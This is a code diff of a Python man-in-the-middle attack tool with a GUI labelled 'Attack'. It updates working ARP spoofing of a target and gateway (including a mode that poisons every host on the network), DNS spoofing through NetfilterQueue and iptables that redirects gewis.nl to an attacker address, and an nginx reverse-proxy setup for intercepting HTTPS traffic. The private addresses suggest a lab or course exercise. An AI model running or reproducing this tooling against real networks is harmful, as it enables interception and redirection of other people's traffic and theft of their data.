@@ -1,32 +1,31 @@
-import PySimpleGUI27 as sg
+import PySimpleGUI as sg
 import sys
 from scapy.all import *
 import os
-import logging as logging
+import logging as log
 from netfilterqueue import NetfilterQueue
 import threading
 
 # setconfigfile("estctwist.nl", "/etc/nginx/sites-enabled/default.conf")
 def setconfigfile(website, path):
     f = open(path, "w")
-    f.write("""
-server {
+    f.write(f"""
+server {{
     listen 80 default_server;
     listen [::]:80 default_server;
     root /var/www/html;
     server_name _;
-    location / {
+    location / {{
         try_files $uri $uri/ =404;
-        proxy_pass https://{hostname}
-    }
-}
-""".format(hostname = website))
+        proxy_pass https://{website};
+    }}
+}}
+""")
     f.close()
     os.system("sudo service nginx restart")
-
 attackerIp = 0 #ip adress attacker, automatic, interface as GUI variable
 TargetIP = '10.0.123.4' #GUI variable, target ip
-RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
+RouterIP = '10.0.123.1' #GUI variable, gateway, evt automatisch
 targetIp = TargetIP
 hostIp = RouterIP #host = router
 includeSSL = False
@@ -53,9 +52,10 @@ layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [at
 window = sg.Window("Attack", layout)
 
 def spoof(targetIp, hostIp, attackerIp):
-
+    print(targetIp)
     targetMac = getmacbyip(targetIp)
-    attackerMac = get_if_hwaddr('enp0s10') #get attacker MAC
+    attackerMac = get_if_hwaddr('enp0s3') #get attacker MAC
+    print(hostIp)
     hostMac = getmacbyip(hostIp)
     
     #send packet "host" to server    
@@ -66,7 +66,7 @@ def spoof(targetIp, hostIp, attackerIp):
     arp[ARP].hwdst = targetMac
     arp[ARP].pdst = targetIp
         
-    sendp(arp, iface="enp0s10")
+    sendp(arp, iface="enp0s3")
     
     #send packet "server" to host
     arp2 = Ether() / ARP()
@@ -76,7 +76,7 @@ def spoof(targetIp, hostIp, attackerIp):
     arp2[ARP].hwdst = hostMac
     arp2[ARP].pdst = hostIp
 
-    sendp(arp2, iface="enp0s10")
+    sendp(arp2, iface="enp0s3")
     
 def full_spoof(targetIP, hostIP, attackerIP):
     #loop trough every ip that could be on your network and be the MITM on all of them
@@ -100,7 +100,7 @@ def end_spoof(targetIp, hostIp, attackerIp):
     correctARP[ARP].psrc = hostIp
     correctARP[ARP].hwdst = targetMac
     correctARP[ARP].pdst = targetIp
-    sendp(correctARP, iface="enp0s10")
+    sendp(correctARP, iface="enp0s3")
     
 class DNSSpoof:
     def __init__(self, dictionary, queueNum):
@@ -115,7 +115,7 @@ class DNSSpoof:
         self.queue.bind(self.queueNum, self.poison)
         try:
             self.queue.run()
-            print 'queue run: '
+            print('queue run: ')
         except KeyboardInterrupt:
             os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
             print("[!] iptable rule flushed")
@@ -134,7 +134,7 @@ class DNSSpoof:
                     del scapyPacket[UDP].len
                     del scapyPacket[UDP].chksum
                     del scapyPacket[Ether].chksum
-                    print "modified", queryName
+                    print("modified", queryName)
                     packet.set_payload(bytes(scapyPacket))
                 else:
                     print("not modified")
@@ -150,10 +150,7 @@ def DNSLoop():
         try:
             #ip adresses that we want to spoof
             dictionary = {
-                b"google.com.": "157.240.201.35",
-                b"www.google.com.": "157.240.201.35",
-                b"www.facebook.com.": "142.251.39.100",
-                b"facebook.com.": "142.251.39.100"
+                b"gewis.nl.": "10.0.123.9"
             }
             queueNum = 1
             dnsspoof = DNSSpoof(dictionary, queueNum)
@@ -180,7 +177,7 @@ def ARPLoop():
 
 def SSLLoop():
     #SSL code
-    print("SSL Test")
+    setconfigfile("gewis.nl", "/etc/nginx/sites-enabled/default")
 
 while True:
     event, values = window.read()
